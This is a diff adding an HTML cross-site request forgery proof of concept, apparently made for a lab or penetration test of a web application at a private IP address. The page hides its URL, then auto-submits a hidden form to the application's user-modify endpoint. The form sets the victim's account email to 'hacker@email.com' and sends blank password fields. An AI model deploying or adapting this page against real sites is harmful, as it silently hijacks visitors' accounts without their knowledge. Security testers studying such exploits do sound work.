@@ -1,0 +1,16 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.109.128/procedure/usermodifyproc.php" method="POST">
+      <input type="hidden" name="name" value="" />
+      <input type="hidden" name="email" value="hacker&#64;email&#46;com" />
+      <input type="hidden" name="password" value="" />
+      <input type="hidden" name="confirm&#95;password" value="" />
+      <input type="hidden" name="submit" value="Submit" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
